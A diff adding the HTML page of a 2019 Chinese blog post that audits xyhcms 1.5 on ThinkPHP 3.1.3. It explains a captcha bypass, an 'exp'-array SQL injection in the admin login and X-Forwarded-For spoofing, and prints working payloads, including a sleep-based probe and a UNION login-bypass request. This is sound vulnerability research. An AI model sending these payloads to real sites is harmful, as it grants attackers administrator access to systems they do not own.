@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-cn">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="代码审计,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言这是我第一次尝试审计cms，这次成功发现了位于xyhai.php页面后台的一个注入漏洞，还顺带找了个验证码绕过。 环境php 5.4.45(php版本可以任意) Nginx 1.14.0 Mysql 5.7.19 xyhcms 1.5 2014年 框架ThinkPHP 3.1.3 漏洞分析验证码绕过先从简单的开始 12345$verify = I(&apos;code&apos;,&apos;&apos;,&apos;md5&apos;);if ($_">
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xyhcms1_5审计">
+<meta property="og:url" content="http://www.star123.top/2019/11/17/xyhcms1.5审计/index.html">
+<meta property="og:site_name" content="star&#39;s blog">
+<meta property="og:description" content="前言这是我第一次尝试审计cms，这次成功发现了位于xyhai.php页面后台的一个注入漏洞，还顺带找了个验证码绕过。 环境php 5.4.45(php版本可以任意) Nginx 1.14.0 Mysql 5.7.19 xyhcms 1.5 2014年 框架ThinkPHP 3.1.3 漏洞分析验证码绕过先从简单的开始 12345$verify = I(&apos;code&apos;,&apos;&apos;,&apos;md5&apos;);if ($_">
+<meta property="og:locale" content="zh-cn">
+<meta property="og:image" content="https://i.loli.net/2019/11/17/kZpt7AmbGjwyQfV.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/17/agL24wtfRBnvNzG.png">
+<meta property="og:updated_time" content="2019-11-17T12:50:50.287Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="xyhcms1_5审计">
+<meta name="twitter:description" content="前言这是我第一次尝试审计cms，这次成功发现了位于xyhai.php页面后台的一个注入漏洞，还顺带找了个验证码绕过。 环境php 5.4.45(php版本可以任意) Nginx 1.14.0 Mysql 5.7.19 xyhcms 1.5 2014年 框架ThinkPHP 3.1.3 漏洞分析验证码绕过先从简单的开始 12345$verify = I(&apos;code&apos;,&apos;&apos;,&apos;md5&apos;);if ($_">
+<meta name="twitter:image" content="https://i.loli.net/2019/11/17/kZpt7AmbGjwyQfV.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.star123.top/2019/11/17/xyhcms1.5审计/">
+
+
+
+
+
+  <title>xyhcms1_5审计 | star's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">star's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.star123.top/2019/11/17/xyhcms1.5审计/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="star">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="star's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">xyhcms1_5审计</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-17T18:49:57+08:00">
+                2019-11-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是我第一次尝试审计cms，这次成功发现了位于xyhai.php页面后台的一个注入漏洞，还顺带找了个验证码绕过。</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>php 5.4.45(php版本可以任意)</p>
+<p>Nginx 1.14.0</p>
+<p>Mysql 5.7.19</p>
+<p>xyhcms 1.5 2014年</p>
+<p>框架ThinkPHP 3.1.3</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过"></a>验证码绕过</h3><p>先从简单的开始</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$verify = I(<span class="string">'code'</span>,<span class="string">''</span>,<span class="string">'md5'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'verify'</span>] != $verify) &#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;error(<span class="string">'验证码不正确'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很典型的验证码没有验证空值。</p>
+<p>对每个请求来说，它们使用Cookie中的PHPSESSID来标识session，如果请求中的PHPSESSID和后端对不上，那么后端就会重置session,导致$_SESSION中的变量的值不存在。</p>
+<p>而这里又用到了php的弱类型，构造null==’’的情况即可绕过验证码限制。</p>
+<h3 id="xyhai-php页面登录绕过"><a href="#xyhai-php页面登录绕过" class="headerlink" title="xyhai.php页面登录绕过"></a>xyhai.php页面登录绕过</h3><p>thinkphp本身是有不少问题的，尤其是涉及到数组处理的情况，在parseWhereItem函数,传入数组元素且第一个元素值是exp，</p>
+<p>那么parseWhereItem就会拼接key和数组的第二个元素。也就是说只要调用了parseWhereItem的函数就可能出现问题。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_array($val))&#123;</span><br><span class="line">    ....</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="string">'exp'</span>==strtolower($val[<span class="number">0</span>]))&#123; <span class="comment">// 使用表达式</span></span><br><span class="line">      $whereStr .= <span class="string">' ('</span>.$key.<span class="string">' '</span>.$val[<span class="number">1</span>].<span class="string">') '</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在thinkphp框架中的include/Lib/Core包中</p>
+<p>parseWhere函数调用parseWhereItem，而又有update，delete，parseSql,还有parseThinkWhere函数调用了parseWhere。</p>
+<p>而delete和update调用parseWhere函数的情况都比较特殊，<br>都需要设置$options中的where，也就是需要查询的where部分可控，然而这点在这个cms中，尤其是前台业务中是比较难做到的。因为大部分update和delete的查询参数都是直接从加密后的cookie中获取的。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span><span class="params">($options=array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;model  =   $options[<span class="string">'model'</span>];</span><br><span class="line">        $sql   = <span class="string">'DELETE FROM '</span></span><br><span class="line">            .<span class="keyword">$this</span>-&gt;parseTable($options[<span class="string">'table'</span>])</span><br><span class="line">            .<span class="keyword">$this</span>-&gt;parseWhere(!<span class="keyword">empty</span>($options[<span class="string">'where'</span>])?$options[<span class="string">'where'</span>]:<span class="string">''</span>)</span><br><span class="line">            .<span class="keyword">$this</span>-&gt;parseOrder(!<span class="keyword">empty</span>($options[<span class="string">'order'</span>])?$options[<span class="string">'order'</span>]:<span class="string">''</span>)</span><br><span class="line">            .<span class="keyword">$this</span>-&gt;parseLimit(!<span class="keyword">empty</span>($options[<span class="string">'limit'</span>])?$options[<span class="string">'limit'</span>]:<span class="string">''</span>)</span><br><span class="line">            .<span class="keyword">$this</span>-&gt;parseLock(<span class="keyword">isset</span>($options[<span class="string">'lock'</span>])?$options[<span class="string">'lock'</span>]:<span class="keyword">false</span>)</span><br><span class="line">            .<span class="keyword">$this</span>-&gt;parseComment(!<span class="keyword">empty</span>($options[<span class="string">'comment'</span>])?$options[<span class="string">'comment'</span>]:<span class="string">''</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;execute($sql,<span class="keyword">$this</span>-&gt;parseBind(!<span class="keyword">empty</span>($options[<span class="string">'bind'</span>])?$options[<span class="string">'bind'</span>]:<span class="keyword">array</span>()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($data,$options)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;model  =   $options[<span class="string">'model'</span>];</span><br><span class="line">        $sql   = <span class="string">'UPDATE '</span></span><br><span class="line">            .<span class="keyword">$this</span>-&gt;parseTable($options[<span class="string">'table'</span>])</span><br><span class="line">            .<span class="keyword">$this</span>-&gt;parseSet($data)</span><br><span class="line">            .<span class="keyword">$this</span>-&gt;parseWhere(!<span class="keyword">empty</span>($options[<span class="string">'where'</span>])?$options[<span class="string">'where'</span>]:<span class="string">''</span>)</span><br><span class="line">            .<span class="keyword">$this</span>-&gt;parseOrder(!<span class="keyword">empty</span>($options[<span class="string">'order'</span>])?$options[<span class="string">'order'</span>]:<span class="string">''</span>)</span><br><span class="line">            .<span class="keyword">$this</span>-&gt;parseLimit(!<span class="keyword">empty</span>($options[<span class="string">'limit'</span>])?$options[<span class="string">'limit'</span>]:<span class="string">''</span>)</span><br><span class="line">            .<span class="keyword">$this</span>-&gt;parseLock(<span class="keyword">isset</span>($options[<span class="string">'lock'</span>])?$options[<span class="string">'lock'</span>]:<span class="keyword">false</span>)</span><br><span class="line">            .<span class="keyword">$this</span>-&gt;parseComment(!<span class="keyword">empty</span>($options[<span class="string">'comment'</span>])?$options[<span class="string">'comment'</span>]:<span class="string">''</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;execute($sql,<span class="keyword">$this</span>-&gt;parseBind(!<span class="keyword">empty</span>($options[<span class="string">'bind'</span>])?$options[<span class="string">'bind'</span>]:<span class="keyword">array</span>()));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们把眼光转向parseSql，他的上家是buildSelectSql，而调用buildSelectSql有一个函数是select，继续跟踪发现，model.class中的find函数也会调用它。</p>
+<p>而这个函数中的options类的保护属性，也就是说可以通过M-&gt;where(array($options))-&gt;find()/或者where()-&gt;find($options)的这种形式传入，也就是说如果我们能找到一处能传入where或者find参数的位置就可以注入了。</p>
+<p>最后我们在后台登录处找了。核心代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!IS_POST)  halt(<span class="string">'页面不存在'</span>);</span><br><span class="line"></span><br><span class="line">		$username = I(<span class="string">'username'</span>,<span class="string">''</span>,<span class="string">'trim'</span>);</span><br><span class="line">		$password = I(<span class="string">'password'</span>,<span class="string">''</span>);</span><br><span class="line">		$verify = I(<span class="string">'code'</span>,<span class="string">''</span>,<span class="string">'md5'</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ($_SESSION[<span class="string">'verify'</span>] != $verify) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;error(<span class="string">'验证码不正确'</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ($username == <span class="string">''</span> || $password == <span class="string">''</span>) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;error(<span class="string">'账号或密码不能为空'</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$user = M(<span class="string">'admin'</span>)-&gt;where(<span class="keyword">array</span>(<span class="string">'username'</span> =&gt; $username))-&gt;find();</span><br><span class="line">		<span class="keyword">if</span> (!$user || ($user[<span class="string">'password'</span>] != get_password($password, $user[<span class="string">'encrypt'</span>]))) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;error(<span class="string">'账号或密码错误'</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ($user[<span class="string">'islock'</span>]) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;error(<span class="string">'用户被锁定！'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么我们构造语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[]=exp&amp;username[]=%3d1%20or%20sleep(10)&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/17/kZpt7AmbGjwyQfV.png" alt="image.png"></p>
+<p>延时10s说明执行成功，执行的语句是 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `xyh_admin` WHERE (  (`username` =1 or sleep(10))  ) LIMIT 1</span><br></pre></td></tr></table></figure>
+
+<p>观察登录逻辑，我们发现验证密码时，会将传入的密码加密后的结果和数据库中的密码比较，而这里的encrypt，password都是查询结果，而我们输入的password又是可控的，也就是说，可以进行登录绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.xyhcms1_5.com/index.php?g=Manage&amp;m=Login&amp;a=login</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">username[]=exp&amp;username[]=%3d%271%27))%20union%20select%201,1,&apos;15ab8357abeb6eacf1b591a1b5b1aedd&apos;,1,1,1,1,1,1,0#&amp;password=1&amp;code=1243</span><br></pre></td></tr></table></figure>
+
+<p>执行的sql语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `xyh_admin` WHERE ((`username` =&apos;1&apos;)) union select 1,1,&apos;15ab8357abeb6eacf1b591a1b5b1aedd&apos;,1,1,1,1,1,1,0#)  ) LIMIT 1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/17/agL24wtfRBnvNzG.png" alt="image.png"></p>
+<p>我们回顾一下整个调用链参数从I()函数输入，经过where()到<br>model class中的find，再到select最后经过Db中的buildSelectSql，再到parseSql，然后达到parseWhereItem。</p>
+<p>不过我写文章的时候好像看Db中的insert函数也有和parseWhereItem一样的问题。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($data,$options=array<span class="params">()</span>,$replace=false)</span> </span>&#123;</span><br><span class="line">        $values  =  $fields    = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;model  =   $options[<span class="string">'model'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key=&gt;$val)&#123;</span><br><span class="line">            <span class="keyword">if</span>(is_array($val) &amp;&amp; <span class="string">'exp'</span> == $val[<span class="number">0</span>])&#123;</span><br><span class="line">                $fields[]   =  <span class="keyword">$this</span>-&gt;parseKey($key);</span><br><span class="line">                $values[]   =  $val[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            ········</span><br><span class="line">            ········</span><br><span class="line">        &#125;</span><br><span class="line">        $sql   =  ($replace?<span class="string">'REPLACE'</span>:<span class="string">'INSERT'</span>).<span class="string">' INTO '</span>.<span class="keyword">$this</span>-&gt;parseTable($options[<span class="string">'table'</span>]).<span class="string">' ('</span>.implode(<span class="string">','</span>, $fields).<span class="string">') VALUES ('</span>.implode(<span class="string">','</span>, $values).<span class="string">')'</span>;</span><br><span class="line">        $sql   .= <span class="keyword">$this</span>-&gt;parseLock(<span class="keyword">isset</span>($options[<span class="string">'lock'</span>])?$options[<span class="string">'lock'</span>]:<span class="keyword">false</span>);</span><br><span class="line">        $sql   .= <span class="keyword">$this</span>-&gt;parseComment(!<span class="keyword">empty</span>($options[<span class="string">'comment'</span>])?$options[<span class="string">'comment'</span>]:<span class="string">''</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;execute($sql,<span class="keyword">$this</span>-&gt;parseBind(!<span class="keyword">empty</span>($options[<span class="string">'bind'</span>])?$options[<span class="string">'bind'</span>]:<span class="keyword">array</span>()));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>而这里的execute函数是提供显示错误信息的，可以使用报错注入回带处想要的数据应该说也相当有用。</p>
+<h3 id="get-client-ip的伪造"><a href="#get-client-ip的伪造" class="headerlink" title="get_client_ip的伪造"></a>get_client_ip的伪造</h3><p>这里和那边的验证码是一个道理，通过伪造随机session和x-forwarded-for值来构造不同的ip。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_client_ip</span><span class="params">($type = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">	$type       =  $type ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">static</span> $ip  =   <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> ($ip !== <span class="keyword">NULL</span>) <span class="keyword">return</span> $ip[$type];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">        $arr    =   explode(<span class="string">','</span>, $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]);</span><br><span class="line">        $pos    =   array_search(<span class="string">'unknown'</span>,$arr);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">false</span> !== $pos) <span class="keyword">unset</span>($arr[$pos]);</span><br><span class="line">        $ip     =   trim($arr[<span class="number">0</span>]);</span><br><span class="line">    &#125;<span class="keyword">elseif</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>])) &#123;</span><br><span class="line">        $ip     =   $_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>];</span><br><span class="line">    &#125;<span class="keyword">elseif</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>])) &#123;</span><br><span class="line">        $ip     =   $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// IP地址合法验证</span></span><br><span class="line">    $long = sprintf(<span class="string">"%u"</span>,ip2long($ip));</span><br><span class="line">    $ip   = $long ? <span class="keyword">array</span>($ip, $long) : <span class="keyword">array</span>(<span class="string">'0.0.0.0'</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> $ip[$type];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一次代码审计总共加起来看了快两天的样子，而且还没有拿到shell,深刻得认识到了自己的菜。不过还有收货了不少tricks。</p>
+<ol>
+<li>tp3 和 tp5一样都在sql语句处理数组上存在问题，碰到类似的就可以全局搜索parseWhereItem或者类型的函数。</li>
+<li>网上的poc看不懂的时候直接拿在cms中找个页面写写查询试试看，跟踪跟踪函数调用，很快就会有自己的发现的。</li>
+<li>phpStorm的findusage很有用，但跟踪不了有些类中的函数，需要靠自己发现，注入这块主要的问题集中在Db.class里，这块还可以好好看看。</li>
+<li>后台尝试过改页面，找上传漏洞等方法，不过好像没有用，这块以后需要多总结经验。</li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/17/论文复现1/" rel="next" title="论文复现1">
+                <i class="fa fa-chevron-left"></i> 论文复现1
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">star</p>
+              <p class="site-description motion-element" itemprop="description">ctf wp and technologies about security</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境"><span class="nav-number">2.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#验证码绕过"><span class="nav-number">3.1.</span> <span class="nav-text">验证码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xyhai-php页面登录绕过"><span class="nav-number">3.2.</span> <span class="nav-text">xyhai.php页面登录绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-client-ip的伪造"><span class="nav-number">3.3.</span> <span class="nav-text">get_client_ip的伪造</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">star</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
